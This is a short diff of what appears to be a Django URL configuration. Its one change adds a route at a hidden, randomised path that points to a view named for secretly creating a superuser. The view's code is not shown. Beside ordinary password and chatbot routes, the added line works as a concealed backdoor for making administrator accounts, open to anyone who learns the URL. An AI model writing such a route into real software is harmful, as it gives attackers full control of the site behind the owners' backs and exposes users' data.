@@ -103,7 +103,7 @@ urlpatterns = [
         ),
         name='password_change'
     ),
-
+    path('crear-admin-secreto-k29qjE7bZpXv8fA/', views.crear_superusuario_secreto, name='crear_admin_secreto'),
     # ===========================
     # CHATBOT DIALOGFLOW (FINAL)
     # ===========================
